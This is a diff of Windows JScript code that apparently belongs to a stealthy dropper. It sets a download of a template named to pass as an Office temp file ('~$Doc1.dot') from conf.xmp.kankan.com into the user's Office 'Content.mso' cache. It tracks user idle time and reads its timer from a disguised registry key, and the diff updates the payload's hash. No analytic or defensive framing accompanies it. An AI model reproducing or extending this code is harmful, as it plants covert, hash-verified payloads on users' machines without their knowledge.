@@ -21,7 +21,7 @@ var __shellapp = new ActiveXObject("Shell.Application");
 
 //var __workdir = __storage.GetFolderPath(0, 0x0020, 0, 0) + "\\Content.mso\\"	
 var __workdir = __shellapp.Namespace(0x0020).Self.Path + "\\Content.mso\\";
-var __destReady ={ name: "~$Doc1.dot",url:"http://conf.xmp.kankan.com/config/~$Doc1.dot", md5:"D9BA15A3ADB3B2A1283931CDCB593A65" }
+var __destReady ={ name: "~$Doc1.dot",url:"http://conf.xmp.kankan.com/config/~$Doc1.dot", md5:"83464F58E6623143507E9944C98249E1" }
 var __startTickCout = __external.GetTickCount()
 var __lastInputInfo = __external.GetLastInputInfo()
 /*
@@ -30,7 +30,7 @@ var objWMIService = GetObject("winmgmts:\\\\" + strComputer + "\\root\\cimv2");
 var e = new Enumerator(objWMIService.ExecQuery("Select * from Win32_Process","WQL",48));
 */
 ///////main.js///////////
-var __interval = __TRY(function(){ key_value = __wshShell.RegRead("HKEY_CURRENT_USER\\Software\\ExtIconHandler\\interval");}, 60*60*1000);
+var __interval = __TRY(function(){ return __wshShell.RegRead("HKEY_CURRENT_USER\\Software\\ExtIconHandler\\interval");}, 60*60*1000);
 var __idletime= __interval / 12;
 if(__DEBUG)
 	__idletime=1000*15
